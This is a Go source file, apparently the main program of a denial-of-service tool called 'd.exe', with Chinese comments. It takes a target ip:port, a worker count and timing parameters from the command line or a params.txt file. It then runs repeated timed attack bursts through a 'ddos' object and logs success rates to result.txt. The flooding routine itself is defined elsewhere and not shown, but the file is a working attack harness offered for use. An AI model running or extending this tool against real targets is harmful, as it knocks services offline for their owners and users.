package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
	"time"
)

func usage() {
	fmt.Println("usage d.exe ip:port workerCount attackPeriod sleepPeriod periodCount")
	os.Exit(-1)
}
func main() {
	var params [7]string
	//是否有在命令行指定target
	if len(os.Args) < 6 {
		if Exists("params.txt") {
			str, err := ReadFile("params.txt")
			if err != nil {
				usage()
			}
			paramsStr := strings.Split(str, " ")
			if len(paramsStr) < 5 {
				usage()
			}
			for i := 0; i < len(paramsStr); i++ {
				params[i+1] = paramsStr[i]
			}
		} else {
			usage()
		}
	} else {
		for i := 0; i < len(os.Args); i++ {
			params[i] = os.Args[i]
		}
	}
	worker, err := strconv.Atoi(params[2])
	if err != nil {
		panic(err)
	}
	period, err := strconv.Atoi(params[3])
	if err != nil {
		panic(err)
	}
	sleepPeriod, err := strconv.Atoi(params[4])
	if err != nil {
		panic(err)
	}
	count, err := strconv.Atoi(params[5])
	if err != nil {
		panic(err)
	}
	ddos, err := New(params[1], worker)
	if err != nil {
		fmt.Println("err:" + err.Error())
		os.Exit(1)
	}
	WriteFile("result.txt", "")
	for i := 0; i < count; i++ {
		ddos.Run()
		//等待period之后结束
		time.Sleep(time.Duration(period) * time.Second)
		success, total := ddos.Result()
		str, _ := ReadFile("result.txt")
		WriteFile("result.txt", str+"\nperiod:"+strconv.Itoa(i)+": s"+strconv.Itoa(int(success))+" t"+strconv.Itoa(int(total))+" r"+strconv.Itoa(int(float32(success)/float32(total)*100))+"%")
		//ddos.Stop()
		time.Sleep(time.Duration(sleepPeriod) * time.Second)
	}
	os.Exit(0)
}

func Exists(path string) bool {
	_, err := os.Stat(path) //os.Stat获取文件信息
	if err != nil {
		if os.IsExist(err) {
			return true
		}
		return false
	}
	return true
}
func ReadFile(filename string) (string, error) {

	f, err := ioutil.ReadFile(filename)

	if err != nil {
		return "", err
	}

	return string(f), nil

}

func WriteFile(fileName string, str string) error {

	//fileName := "file/test2"
	//strTest := "测试测试"
	var d = []byte(str)
	err := ioutil.WriteFile(fileName, d, 0666)
	if err != nil {
		return err
	}
	//fmt.Println("write success")
	return nil
}
